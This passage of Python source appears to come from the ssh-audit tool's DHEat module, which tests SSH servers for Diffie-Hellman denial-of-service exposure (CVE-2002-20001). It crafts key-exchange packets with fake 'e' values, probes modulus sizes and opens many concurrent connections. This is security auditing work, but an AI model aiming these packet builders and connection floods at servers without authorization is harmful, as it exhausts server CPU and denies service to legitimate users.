"""
   The MIT License (MIT)

   Copyright (C) 2023-2024 Joe Testa (jtesta@positronsecurity.com)

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in
   all copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
   THE SOFTWARE.
"""
import multiprocessing
import os
import queue
import random
import select
import socket
import struct
import sys
import time
import traceback

from typing import Any, Dict, List, Optional, Tuple

from ssh_audit.auditconf import AuditConf
from ssh_audit.banner import Banner
from ssh_audit import exitcodes
from ssh_audit.gextest import GEXTest
from ssh_audit.globals import SSH_HEADER
from ssh_audit.ssh_socket import SSH_Socket
from ssh_audit.ssh2_kex import SSH2_Kex
from ssh_audit.outputbuffer import OutputBuffer
from ssh_audit.writebuf import WriteBuf


class DHEat:

    # Maximum number of connections per second the server can allow until a warning is issued when Diffie-Hellman algorithms are supported.
    MAX_SAFE_RATE = 20.0

    # The warning added to DH algorithms in the UI when dh_rate_test determines that no throttling is being done.
    DHEAT_WARNING = "Potentially insufficient connection throttling detected, resulting in possible vulnerability to the DHEat DoS attack (CVE-2002-20001).  Either connection throttling or removal of Diffie-Hellman key exchanges is necessary to remediate this issue.  Suppress this test/message with --skip-rate-test.  Additional info: {connections:d} connections were created in {time_elapsed:.3f} seconds, or {rate:.1f} conns/sec; server must respond with a rate less than {max_safe_rate:.1f} conns/sec to be considered safe."

    # List of the Diffie-Hellman group exchange algorithms this test supports.
    gex_algs = [
        "diffie-hellman-group-exchange-sha256",  # Implemented in OpenSSH.
        "diffie-hellman-group-exchange-sha1",    # Implemented in OpenSSH.
        "diffie-hellman-group-exchange-sha224@ssh.com",
        "diffie-hellman-group-exchange-sha256@ssh.com",
        "diffie-hellman-group-exchange-sha384@ssh.com",
        "diffie-hellman-group-exchange-sha512@ssh.com",
    ]

    # List of key exchange algorithms, sorted by largest modulus size.
    alg_priority = [
        "diffie-hellman-group18-sha512",  # Implemented in OpenSSH.
        "diffie-hellman-group18-sha512@ssh.com",
        "diffie-hellman-group17-sha512",
        "diffie-hellman_group17-sha512",  # Note that this is not the same as the one above it.
        "diffie-hellman-group16-sha512",  # Implemented in OpenSSH.
        "diffie-hellman-group16-sha256",
        "diffie-hellman-group16-sha384@ssh.com",
        "diffie-hellman-group16-sha512",
        "diffie-hellman-group16-sha512@ssh.com",
        "diffie-hellman-group15-sha256",
        "diffie-hellman-group15-sha256@ssh.com",
        "diffie-hellman-group15-sha384@ssh.com",
        "diffie-hellman-group15-sha512",
        "diffie-hellman-group14-sha256",  # Implemented in OpenSSH.
        "diffie-hellman-group14-sha1",    # Implemented in OpenSSH.
        "diffie-hellman-group14-sha224@ssh.com",
        "diffie-hellman-group14-sha256@ssh.com",
        "diffie-hellman-group1-sha1",     # Implemented in OpenSSH.
        "diffie-hellman-group1-sha256",
        "curve25519-sha256",              # Implemented in OpenSSH.
        "curve25519-sha256@libssh.org",   # Implemented in OpenSSH.
        "ecdh-sha2-nistp256",             # Implemented in OpenSSH.
        "ecdh-sha2-nistp384",             # Implemented in OpenSSH.
        "ecdh-sha2-nistp521",             # Implemented in OpenSSH.
        "sntrup761x25519-sha512@openssh.com",  # Implemented in OpenSSH.
    ]

    # Dictionary of key exchanges mapped to their modulus size.
    alg_modulus_sizes = {
        "diffie-hellman-group18-sha512": 8192,
        "diffie-hellman-group18-sha512@ssh.com": 8192,
        "diffie-hellman-group17-sha512": 6144,
        "diffie-hellman_group17-sha512": 6144,
        "diffie-hellman-group16-sha512": 4096,
        "diffie-hellman-group16-sha256": 4096,
        "diffie-hellman-group16-sha384@ssh.com": 4096,
        "diffie-hellman-group16-sha512@ssh.com": 4096,
        "diffie-hellman-group15-sha256": 3072,
        "diffie-hellman-group15-sha256@ssh.com": 3072,
        "diffie-hellman-group15-sha384@ssh.com": 3072,
        "diffie-hellman-group15-sha512": 3072,
        "diffie-hellman-group14-sha256": 2048,
        "diffie-hellman-group14-sha1": 2048,
        "diffie-hellman-group14-sha224@ssh.com": 2048,
        "diffie-hellman-group14-sha256@ssh.com": 2048,
        "diffie-hellman-group1-sha1": 1024,
        "diffie-hellman-group1-sha256": 1024,
        "curve25519-sha256": (31 * 8),
        "curve25519-sha256@libssh.org": (31 * 8),
        "ecdh-sha2-nistp256": (64 * 8),
        "ecdh-sha2-nistp384": (96 * 8),
        "ecdh-sha2-nistp521": (132 * 8),
        "sntrup761x25519-sha512@openssh.com": (1189 * 8),
    }

    # List of DH algorithms that have been validated by the maintainer.  There is quite the long list of DH algorithms available (see above), and testing them all would require a lot of time as many are not implemented in OpenSSH.  So perhaps the community can help with testing...
    tested_algs = ["diffie-hellman-group18-sha512", "diffie-hellman-group16-sha512", "diffie-hellman-group-exchange-sha256", "ecdh-sha2-nistp256", "ecdh-sha2-nistp384", "ecdh-sha2-nistp521", "curve25519-sha256", "curve25519-sha256@libssh.org", "sntrup761x25519-sha512@openssh.com"]

    # If a DH algorithm is used that is not in the tested_algs list, above, then write this notice to the user.
    untested_alg_notice = "{color_start:s}NOTE:{color_end:s} the target DH algorithm ({dh_alg:s}) has not been tested by the maintainer.  If you can verify that the server's CPU is fully utilized, please copy/paste this output to jtesta@positronsecurity.com."

    # Hardcoded ECDH ephemeral public keys for NIST-P256, NIST-P384, and NIST-P521.  These need to lie on the ellipical curve in order to be accepted by the server, so generating them quickly isn't easy without an external crypto library.  So we'll just use some hardcoded ones.
    HARDCODED_NISTP256 = b"\x04\x9d\x32\xad\x75\x68\xc3\x43\x30\x12\x1b\x64\x5d\x12\x3e\x18\x7b\xd2\x5a\xd6\x42\x6b\xb5\xab\xa3\x16\xda\x64\xe7\x15\x22\xd2\x66\xae\xcb\xcc\x9c\x64\x57\x32\x76\x41\x74\xeb\xff\xda\x28\xd6\x6e\x10\x98\x60\x56\x74\x30\x37\x97\xd2\x7f\x29\xd9\x99\xf1\x58\x8a"
    HARDCODED_NISTP384 = b"\x04\x94\xd9\xd2\x49\xac\xb6\x23\x59\x47\x32\x50\x5f\xaf\x55\x6e\x7a\x4a\x00\x82\xd9\xb1\x4c\xe4\x61\x05\x70\x91\x99\x19\xbe\x84\x2d\x3a\x74\x7c\xd8\xd1\xc1\x1a\x5c\xbf\xd3\x33\xcb\x25\x51\x1c\x66\x76\x53\x04\x92\x4f\xb3\x1f\x9b\x19\xba\x6b\x1a\xe2\x91\x04\xc6\x4c\x9c\xec\xa9\x43\xd0\x2e\x08\x4b\x2a\x50\xcf\x31\x46\xb3\x6c\x29\xd0\xf1\x26\x9e\x57\x17\xe1\xf8\x29\xce\xb5\x9a\x96\x2b\x94"
    HARDCODED_NISTP521 = b"\x04\x00\x51\xb7\xf4\x51\x54\x7c\x60\xd9\xe8\x90\x8f\x40\xcd\x05\x7e\x75\xcf\xfc\x3b\xe8\xa6\x45\x8b\xe3\xb5\x99\x75\xf6\x42\xef\x34\x5a\x9a\x86\x90\x43\x52\x62\x49\xd9\x62\x50\xc0\xb7\xdd\xe0\x34\x2e\x25\x3f\x3e\x1f\x19\xdd\xf5\xc9\x11\xe4\x6f\xd0\xe2\x59\x86\xc3\x7b\x01\xd3\xf7\x5a\x28\x72\x73\x3c\x7e\x4d\x8f\x08\x2a\x70\x94\x93\x83\xe2\xed\xf2\xd6\xf6\x3e\x63\xb8\xb9\xaa\x83\x2a\xd3\x96\xca\xde\x38\x62\x19\x1e\x84\x84\xad\xfe\x06\xfc\x2b\xb2\x1b\x79\x63\xfc\x1e\x6d\x85\x14\xba\x3c\x64\xd9\x64\x75\xd5\x74\xcb\x5b\x3d\xc3\x9f"

    # Algorithms that must use hard-coded e values.
    HARDCODED_ALGS = ["ecdh-sha2-nistp256", "ecdh-sha2-nistp384", "ecdh-sha2-nistp521"]

    # Post-quantum algorithms matched with traditional crypto.
    COMPLEX_PQ_ALGS = ["sntrup761x25519-sha512@openssh.com"]

    CLEAR = ""
    BLUEB = ""
    GREENB = ""
    PURPLEB = ""
    REDB = ""
    WHITEB = ""
    YELLOWB = ""
    BAR_CHART = " "
    CHART_UPWARDS = " "

    def __init__(self, out: 'OutputBuffer', aconf: 'AuditConf', banner: Optional['Banner'], kex: 'SSH2_Kex') -> None:
        self.out = out
        self.target = aconf.host
        self.port = aconf.port

        # We'll use the server's banner as our own.  Otherwise, use ssh-audit's default.
        self.banner = SSH_HEADER.format("2.0").encode("utf-8") + b"\r\n"
        if banner is not None:
            self.banner = str(banner).encode("utf-8") + b"\r\n"

        # The SSH2_Kex object that we recieved from the server in a prior connection.  We'll use it as a template to craft our own kex.
        self.kex = kex

        # The connection and read timeouts.
        self.connect_timeout = aconf.timeout
        self.read_timeout = aconf.timeout

        # True when we are in debug mode.
        self.debug_mode = aconf.debug

        # The length of our fake e value to give to the server.  It is automatically set based on the DH modulus size we are targeting, or by the user for advanced testing.
        self.e_rand_len = 0

        # The SSH Key Exchange Init message.  This is the same for each connection (minus the random 16-byte cookie field, so it will be pre-computed to save time.
        self.kex_init_body = b''

        # Disable buffered output.
        self.out.buffer_output = False

        # We'll use a weak/fast PRNG to generate the most significant byte of our fake e response to the server.
        random.seed()

        # Attack statistics.
        self.num_attempted_tcp_connections = 0
        self.num_successful_tcp_connections = 0
        self.num_successful_dh_kex = 0
        self.num_failed_dh_kex = 0
        self.num_bytes_written = 0
        self.num_connect_timeouts = 0
        self.num_read_timeouts = 0
        self.num_socket_exceptions = 0
        self.num_openssh_throttled_connections = 0

        # The time we started the attack.
        self.start_timer = 0.0

        # The number of concurrent sockets to open with the server.
        self.concurrent_connections = 10

        # The key exchange algorithm name that we are targeting on the server.  If empty, we will choose the best available option.  Otherwise, it is set by the user.
        self.target_kex = ""

        self.user_set_e_len = False
        self.send_all_packets_at_once = False
        if aconf.dheat is not None:
            self.concurrent_connections = aconf.dheat_concurrent_connections
            self.target_kex = aconf.dheat_target_alg

            # If the user specified a length of e to use instead of the correct length determined at run-time.
            if aconf.dheat_e_length > 0:
                self.send_all_packets_at_once = True  # If the user specified the e length (which is non-standard), we'll also send all SSH packets at once to reduce latency (which is also non-standard).  This involves sending the banner, KEX INIT, DH KEX INIT all in the same packet without waiting for the server to respond to them individually.
                self.user_set_e_len = True
                self.e_rand_len = aconf.dheat_e_length

        # User wants to perform a rate test.
        self.rate_test = False
        self.target_rate = 0  # When performing a rate test, this is the number of successful connections per second we are targeting.  0=no rate limit.
        if aconf.conn_rate_test_enabled:
            self.rate_test = True
            self.concurrent_connections = aconf.conn_rate_test_threads
            self.target_rate = aconf.conn_rate_test_target_rate

        # Set the color flags & emjojis, if applicable.
        if aconf.colors:
            DHEat.CLEAR = "\033[0m"
            DHEat.WHITEB = "\033[1;97m"
            DHEat.BLUEB = "\033[1;94m"    # Blue + bold
            DHEat.PURPLEB = "\033[1;95m"  # Purple + bold
            DHEat.YELLOWB = "\033[1;93m"  # Yellow + bold
            DHEat.GREENB = "\033[1;92m"   # Green + bold
            DHEat.REDB = "\033[1;91m"     # Red + bold
            DHEat.BAR_CHART = "\U0001F4CA"  # The bar chart emoji.
            DHEat.CHART_UPWARDS = "\U0001F4C8"  # The upwards chart emoji.


    @staticmethod
    def add_byte_units(n: float) -> str:
        '''Converts a number of bytes to a human-readable representation (i.e.: 10000 -> "9.8KB").'''

        if n >= 1073741824:
            return "%.1fGB" % (n / 1073741824)
        if n >= 1048576:
            return "%.1fMB" % (n / 1048576)
        if n >= 1024:
            return "%.1fKB" % (n / 1024)

        return "%u bytes" % n


    def analyze_gex(self, server_gex_alg: str) -> int:
        '''Analyzes a server's Diffie-Hellman group exchange algorithm.  The largest modulus it supports is determined, then it is inserted into DHEat.alg_priority list while maintaining order by largest modulus.  The largest modulus is also returned.'''

        self.output("Analyzing server's group exchange algorithm, %s, to find largest modulus it supports..." % (server_gex_alg))

        largest_bit_modulus = 0
        try:
            largest_bit_modulus = self.get_largest_gex_modulus(server_gex_alg)
        except Exception:
            # On exception, simply print the stack trace and continue on.
            traceback.print_exc()

        if largest_bit_modulus > 0:
            DHEat.alg_modulus_sizes[server_gex_alg] = largest_bit_modulus
            self.debug("GEX algorithm [%s] supports a max modulus of %u bits." % (server_gex_alg, largest_bit_modulus))

            # Now that we have the largest modulus for this GEX, insert it into the prioritized list of algorithms.  If, say, there are three 8192-bit kex algorithms in the list, we'll insert it as the 4th entry, as plain KEX algorithms require less network activity to trigger than GEX.
            i = 0
            inserted = False
            while i < len(DHEat.alg_priority):
                prioritized_alg = DHEat.alg_priority[i]
                prioritized_alg_size = DHEat.alg_modulus_sizes[prioritized_alg]
                if largest_bit_modulus > prioritized_alg_size + 1:  # + 1 to ensure algs with equal number of bits keep priority over this GEX.
                    DHEat.alg_priority.insert(i, server_gex_alg)
                    inserted = True
                    self.debug("Inserted %s into prioritized algorithm list at index %u: [%s]" % (server_gex_alg, i, ", ".join(DHEat.alg_priority)))
                    break

                i += 1

            # Handle the case where all existing algs have a larger modulus.
            if inserted is False:
                DHEat.alg_priority.append(server_gex_alg)
                self.debug("Appended %s to end of prioritized algorithm list: [%s]" % (server_gex_alg, ", ".join(DHEat.alg_priority)))

        self.output("The largest modulus supported by %s appears to be %u." % (server_gex_alg, largest_bit_modulus))
        return largest_bit_modulus


    def debug(self, s: str) -> None:
        '''Prints a string to the console when debugging mode is enabled.'''

        self.out.d(s)


    @staticmethod
    def dh_rate_test(out: 'OutputBuffer', aconf: 'AuditConf', kex: 'SSH2_Kex', max_time: float, max_connections: int, concurrent_sockets: int) -> str:
        '''Attempts to quickly create many sockets to the target server.  This simulates the DHEat attack without causing an actual DoS condition.  If a rate greater than MAX_SAFE_RATE is allowed, then a warning string is returned.'''

        # Gracefully handle when the user presses CTRL-C to break the interactive rate test.
        ret = ""
        try:
            ret = DHEat._dh_rate_test(out, aconf, kex, max_time, max_connections, concurrent_sockets)
        except KeyboardInterrupt:
            print()

        return ret


    @staticmethod
    def _dh_rate_test(out: 'OutputBuffer', aconf: 'AuditConf', kex: 'SSH2_Kex', max_time: float, max_connections: int, concurrent_sockets: int) -> str:
        '''Attempts to quickly create many sockets to the target server.  This simulates the DHEat attack without causing an actual DoS condition.  If a rate greater than MAX_SAFE_RATE is allowed, then a warning string is returned.'''

        def _close_socket(socket_list: List[socket.socket], s: socket.socket) -> None:
            try:
                s.shutdown(socket.SHUT_RDWR)
                s.close()
            except OSError:
                pass

            socket_list.remove(s)

        if sys.platform == "win32":
            DHEat.YELLOWB = "\033[1;93m"
            DHEat.CLEAR = "\033[0m"
            print("\n%sUnfortunately, this feature is not currently functional under Windows.%s  This should get fixed in a future release.  See: <https://github.com/jtesta/ssh-audit/issues/261>" % (DHEat.YELLOWB, DHEat.CLEAR))
            return ""

        spinner = ["-", "\\", "|", "/"]
        spinner_index = 0

        # If the user passed --conn-rate-test, then we'll perform an interactive rate test against the target.
        interactive = False
        if aconf.conn_rate_test_enabled:
            interactive = True
            max_connections = 999999999999999999
            concurrent_sockets = aconf.conn_rate_test_threads

            DHEat.CLEAR = "\033[0m"
            DHEat.WHITEB = "\033[1;97m"
            DHEat.BLUEB = "\033[1;94m"

            rate_str = ""
            if aconf.conn_rate_test_target_rate > 0:
                rate_str = " at a max rate of %s%u%s connections per second" % (DHEat.WHITEB, aconf.conn_rate_test_target_rate, DHEat.CLEAR)

            print()
            print("Performing non-disruptive rate test against %s[%s]:%u%s with %s%u%s concurrent sockets%s.  No Diffie-Hellman requests will be sent." % (DHEat.WHITEB, aconf.host, aconf.port, DHEat.CLEAR, DHEat.WHITEB, concurrent_sockets, DHEat.CLEAR, rate_str))
            print()

        else:  # We'll do a non-interactive test as part of a standard audit.
            # Ensure that the server supports at least one DH algorithm.  Otherwise, this test is pointless.
            server_dh_kex = []
            for server_kex in kex.kex_algorithms:
                if (server_kex in DHEat.alg_priority) or (server_kex in DHEat.gex_algs):
                    server_dh_kex.append(server_kex)

            if len(server_dh_kex) == 0:
                out.d("Skipping DHEat.dh_rate_test() since server does not support any DH algorithms: [%s]" % ", ".join(kex.kex_algorithms))
                return ""
            else:
                out.d("DHEat.dh_rate_test(): starting test; parameters: %f seconds, %u max connections, %u concurrent sockets." % (max_time, max_connections, concurrent_sockets))

        num_attempted_connections = 0
        num_opened_connections = 0
        socket_list: List[socket.socket] = []
        start_timer = time.time()
        last_update = start_timer
        while True:

            # During non-interactive tests, limit based on time and number of connections.  Otherwise, we loop indefinitely until the user presses CTRL-C.
            if (interactive is False) and ((time.time() - start_timer) >= max_time) and (num_opened_connections >= max_connections):
                break

            # Give the user some interactive feedback.
            if interactive:
                now = time.time()
                if (now - last_update) >= 1.0:
                    seconds_running = now - start_timer
                    print("%s%s%s Run time: %s%.1f%s; TCP SYNs: %s%u%s; Compl. conns: %s%u%s; TCP SYNs/sec: %s%.1f%s; Compl. conns/sec: %s%.1f%s    \r" % (DHEat.WHITEB, spinner[spinner_index], DHEat.CLEAR, DHEat.WHITEB, seconds_running, DHEat.CLEAR, DHEat.WHITEB, num_attempted_connections, DHEat.CLEAR, DHEat.WHITEB, num_opened_connections, DHEat.CLEAR, DHEat.BLUEB, num_attempted_connections / seconds_running, DHEat.CLEAR, DHEat.BLUEB, num_opened_connections / seconds_running, DHEat.CLEAR), end="")
                    last_update = now
                    spinner_index = (spinner_index + 1) % 4

                # If a max rate per second was specified, calculate the amount of time to sleep so we don't exceed it.
                if aconf.conn_rate_test_target_rate > 0:
                    time_so_far = now - start_timer
                    current_rate = num_opened_connections / time_so_far
                    if current_rate > aconf.conn_rate_test_target_rate:
                        sleep_time = num_opened_connections / (aconf.conn_rate_test_target_rate * time_so_far)
                        if sleep_time > 0.0:
                            time.sleep(sleep_time)

            while (len(socket_list) < concurrent_sockets) and (len(socket_list) + num_opened_connections < max_connections):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setblocking(False)

                out.d("Creating socket (%u of %u already exist)..." % (len(socket_list), concurrent_sockets))
                ret = s.connect_ex((aconf.host, aconf.port))
                num_attempted_connections += 1
                if ret in [0, 115]:  # Check if connection is successful or EINPROGRESS.
                    socket_list.append(s)

            rlist, _, elist = select.select(socket_list, [], socket_list, 0.1)

            # For each socket that has something for us to read...
            for s in rlist:
                buf = b''
                try:
                    buf = s.recv(8)
                except (ConnectionResetError, BrokenPipeError):
                    _close_socket(socket_list, s)
                    continue

                # If we received the SSH header, we'll count this as an opened connection.
                if buf.startswith(b"SSH-"):
                    num_opened_connections += 1
                    out.d("Number of opened connections: %u (max: %u)." % (num_opened_connections, max_connections))

                _close_socket(socket_list, s)

                # Since we just closed the socket, ensure its not in the exception list.
                if s in elist:
                    elist.remove(s)

            # Close all sockets that are in the exception state.
            for s in elist:
                _close_socket(socket_list, s)

        # Close any remaining sockets.
        while len(socket_list) > 0:
            _close_socket(socket_list, socket_list[0])

        time_elapsed = time.time() - start_timer
        out.d("DHEat.dh_rate_test() results: time elapsed: %f; connections created: %u" % (time_elapsed, num_opened_connections))

        note = ""
        rate = 0.0
        if time_elapsed > 0.0 and num_opened_connections > 0:
            rate = num_opened_connections / time_elapsed
            out.d("DHEat.dh_rate_test() results: %.1f connections opened per second." % rate)

            # If we were able to open connections at a rate greater than 25 per second, then we need to warn the user.
            if rate > DHEat.MAX_SAFE_RATE:
                note = DHEat.DHEAT_WARNING.format(connections=num_opened_connections, time_elapsed=time_elapsed, rate=rate, max_safe_rate=DHEat.MAX_SAFE_RATE)

        return note


    def generate_kex(self, chosen_kex_alg: str) -> None:
        '''Generates and sets the Key Exchange Init message we'll send to the server on each connection.'''

        # The kex template we use is the server's own kex returned from an initial connection.  We'll only specify the first algorithm in each field for efficiency, since the server already told us it supports them.
        wbuf = WriteBuf()
        wbuf.write_list([chosen_kex_alg])
        wbuf.write_list([self.kex.key_algorithms[0]] if len(self.kex.key_algorithms) > 0 else [])
        wbuf.write_list([self.kex.client.encryption[0]] if len(self.kex.client.encryption) > 0 else [])
        wbuf.write_list([self.kex.server.encryption[0]] if len(self.kex.server.encryption) > 0 else [])
        wbuf.write_list([self.kex.client.mac[0]] if len(self.kex.client.mac) > 0 else [])
        wbuf.write_list([self.kex.server.mac[0]] if len(self.kex.server.mac) > 0 else [])
        wbuf.write_list([self.kex.client.compression[0]] if len(self.kex.client.compression) > 0 else [])
        wbuf.write_list([self.kex.server.compression[0]] if len(self.kex.server.compression) > 0 else [])
        wbuf.write_list([self.kex.client.languages[0]] if len(self.kex.client.languages) > 0 else [])
        wbuf.write_list([self.kex.server.languages[0]] if len(self.kex.server.languages) > 0 else [])
        wbuf.write_bool(self.kex.follows)
        wbuf.write_int(self.kex.unused)
        self.kex_init_body = wbuf.write_flush()


    def get_largest_gex_modulus(self, server_gex_alg: str) -> int:
        '''Probes the server for the largest modulus size it supports through group-exchange algorithms.'''

        self.debug("Called get_largest_gex_modulus(%s)." % server_gex_alg)

        ssh_socket = SSH_Socket(self.out, self.target, self.port, timeout=self.connect_timeout, timeout_set=True)
        new_kex = SSH2_Kex(self.out, self.kex.cookie, [server_gex_alg], self.kex.key_algorithms, self.kex.client, self.kex.server, False, unused=0)

        # First, let's try a range of ridiculously large bits.  This is unlikely to work, but it would make things very interesting if they did!
        ret: Dict[str, List[int]] = {}
        if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, 9216, 12288, 16384, ret) == exitcodes.GOOD and server_gex_alg in ret:

            # Check that what the server accepted lies within the range we requested.
            accepted_bits = ret[server_gex_alg][0]
            if accepted_bits >= 9216:
                self.debug("get_largest_gex_modulus(%s) returning %u." % (server_gex_alg, accepted_bits))
                ssh_socket.close()
                return accepted_bits
            else:
                self.debug("get_largest_gex_modulus(%s): received smaller bits (%u) than requested (9216 - 16384); continuing..." % (server_gex_alg, accepted_bits))

        # Check the largest bit sizes first, and stop the moment we find something the server supports.
        for bits in [8192, 7680, 6144, 4096, 3072, 2048, 1024]:
            ret.clear()
            if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, bits, bits, bits, ret) == exitcodes.GOOD and server_gex_alg in ret:

                # Check that what the server accepted lies within the range we requested.
                accepted_bits = ret[server_gex_alg][0]
                if accepted_bits == bits:
                    self.debug("get_largest_gex_modulus(%s) returning %u." % (server_gex_alg, accepted_bits))
                    ssh_socket.close()
                    return accepted_bits
                self.debug("get_largest_gex_modulus(%s): received smaller bits (%u) than requested (%u); continuing..." % (server_gex_alg, accepted_bits, bits))

        # Our standard bit sizes failed above, so let's try a range from 1024 - 8192 as a last attempt...
        ret.clear()
        if GEXTest.granular_modulus_size_test(self.out, ssh_socket, new_kex, 1024, 4096, 8192, ret) == exitcodes.GOOD and server_gex_alg in ret:
            accepted_bits = ret[server_gex_alg][0]
            self.debug("get_largest_gex_modulus(%s) returning %u." % (server_gex_alg, accepted_bits))
            ssh_socket.close()
            return accepted_bits

        # Total failure.  :(
        return 0


    def get_padding(self, payload: bytes) -> Tuple[int, bytes]:
        '''Given a payload, returns the padding length and the padding.'''

        pad_len = -(len(payload) + 5) % 8
        if pad_len < 4:
            pad_len += 8
        padding = b"\x00" * pad_len

        return pad_len, padding


    def make_dh_kexinit(self, chosen_alg: str, gex_msb: int = -1) -> bytes:
        '''Makes a Diffie-Hellman Key Exchange Init packet.  Instead of calculating a real value for e, a random value less than p - 1 is constructed.'''

        # Start with a zero-byte to signify that this is not a negative number.  The second byte must be 0xfe or smaller so as to ensure that our value of e < p - 1 (otherwise the server will reject it).  All bytes thereafter can be random.

        message_code = b'\x1e'  # Diffie-Hellman Key Exchange Init (30)
        max_msb = 254  # The most significant byte for KEX must be between 0x00 and 0xFE (inclusive).
        if gex_msb != -1:
            message_code = b'\x20'  # Diffie-Hellman Group Exchange Init (32)
            max_msb = gex_msb - 1  # During the GEX negotiation, the server returned a custom p value.  Subtracting by 1 ensures e < p - 1.

        if chosen_alg == "ecdh-sha2-nistp256":
            e = DHEat.HARDCODED_NISTP256
        elif chosen_alg == "ecdh-sha2-nistp384":
            e = DHEat.HARDCODED_NISTP384
        elif chosen_alg == "ecdh-sha2-nistp521":
            e = DHEat.HARDCODED_NISTP521
        else:
            e = b"\x00" + int.to_bytes(random.randint(0, max_msb), length=1, byteorder="big") + os.urandom(self.e_rand_len)

        payload = message_code + struct.pack("!L", len(e)) + e
        pad_len, padding = self.get_padding(payload)

        return struct.pack("!LB", len(payload) + pad_len + 1, pad_len) + payload + padding


    def make_gex_request(self, gex_modulus_size: int) -> bytes:
        '''Creates a Diffie-Hellman Group Exchange Request packet.'''

        # Message code = 0x22 = Diffie-Hellman Group Exchange Request (34).
        payload = b'\x22' + struct.pack("!LLL", gex_modulus_size, gex_modulus_size, gex_modulus_size)
        pad_len, padding = self.get_padding(payload)

        return struct.pack("!LB", len(payload) + pad_len + 1, pad_len) + payload + padding


    def make_kexinit(self) -> bytes:
        '''Creates a complete Key Exchange Init packet, which contains the kex algorithm we're targeting, host keys & ciphers we support, etc.  The algorithms we claim to support is really the list that the server gave to us in order to guarantee that it will accept our message.'''

        # Message code = 0x14 = Key Exchange Init (20).
        payload = b'\x14' + os.urandom(16) + self.kex_init_body
        pad_len, padding = self.get_padding(payload)

        return struct.pack("!LB", len(payload) + pad_len + 1, pad_len) + payload + padding


    def output(self, s: str = "") -> None:
        self.out.info(s)


    def read_banner(self, s: socket.socket) -> Tuple[bytes, bytes]:
        '''Returns the server's banner.  Optionally returns extra bytes that came after the banner.'''

        read_buffer = b''
        newline_pos = -1
        timer = time.time()
        while newline_pos == -1:
            if (time.time() - timer) >= self.read_timeout:
                return b'', b''

            buf = b''
            try:
                buf = s.recv(32)
            except ConnectionResetError:
                return b'', b''
            except socket.timeout:
                return b'', b''

            if len(buf) == 0:
                return b'', b''

            read_buffer += buf
            newline_pos = read_buffer.find(b"\r\n")

        extra = b''
        if len(read_buffer) > newline_pos + 2:
            extra = read_buffer[newline_pos + 2:]

        return read_buffer[0:newline_pos], extra


    def read_ssh_packet(self, s: socket.socket, extra: bytes = b'') -> Tuple[int, int]:
        '''Reads an SSH packet and returns its message code.  When Diffie-Hellman Key Exchange Reply (31) packets are read, the most-significant byte of the GEX p-value is also returned.'''

        extra_len = len(extra)
        buf = b''
        if extra_len < 5:
            # self.debug("Obtaining lengths by reading %u bytes." % (5 - extra_len))
            buf = s.recv(5 - extra_len)
            if len(buf) == 0:
                return -1, -1

            buf = extra + buf
            extra = b''
            extra_len = 0
        else:
            buf = extra[0:5]
            extra = extra[5:]
            extra_len = len(extra)

        # self.debug("Unpacking lengths: %s" % buf)
        packet_len, padding_len = struct.unpack("!LB", buf)  # pylint: disable=unused-variable
        # self.debug("Packet len: %u; padding len: %u" % (packet_len, padding_len))

        packet_len -= 1
        buf = extra + s.recv(packet_len - extra_len)
        if buf == b"":
            return -1, -1

        message_code = buf[0]

        # If this is a Diffie-Hellman Key Exchange Reply (31), then obtain the most-significant byte of the p-value returned.
        gex_msb = -1
        if message_code == 31 and len(buf) > 6:
            gex_msb = buf[5] if buf[5] != 0 else buf[6]

        return message_code, gex_msb


    def run(self) -> None:
        '''Main entrypoint for testing the server.'''


        self.start_timer = time.time()

        # Run against the server until the user presses CTRL-C, then dump statistics.
        success = True
        try:
            success = self._run()
        except KeyboardInterrupt:
            pass

        # Don't print statistics if it failed to run.
        if not success:
            return

        # Print extensive statistics on what just happened.
        seconds_running = time.time() - self.start_timer
        print("\n\n")
        print("                        %s %sSTATISTICS%s %s" % (self.BAR_CHART, self.WHITEB, self.CLEAR, self.CHART_UPWARDS))
        print("                           %s----------%s" % (self.WHITEB, self.CLEAR))
        print()
        print("                       Run time: %s%.1f seconds%s" % (self.WHITEB, seconds_running, self.CLEAR))
        print()
        print("      Attempted TCP connections: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_attempted_tcp_connections / seconds_running, self.num_attempted_tcp_connections, self.CLEAR))
        print("     Successful TCP connections: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_successful_tcp_connections / seconds_running, self.num_successful_tcp_connections, self.CLEAR))
        print()
        print("                  Bytes written: %s%s/sec, %s total%s" % (self.WHITEB, DHEat.add_byte_units(self.num_bytes_written / seconds_running), DHEat.add_byte_units(self.num_bytes_written), self.CLEAR))
        print()
        print("      Successful DH KEX replies: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_successful_dh_kex / seconds_running, self.num_successful_dh_kex, self.CLEAR))
        print("      Unexpected DH KEX replies: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_failed_dh_kex / seconds_running, self.num_failed_dh_kex, self.CLEAR))
        print("\"Exceeded MaxStartups\" replies*: %s%.1f/sec, %u total%s" % (self.WHITEB, self.num_openssh_throttled_connections / seconds_running, self.num_openssh_throttled_connections, self.CLEAR))
        print()
        print("            Connection timeouts: %s%.1f/sec, %u total%s (timeout setting: %.1f sec)" % (self.WHITEB, self.num_connect_timeouts / seconds_running, self.num_connect_timeouts, self.CLEAR, self.connect_timeout))
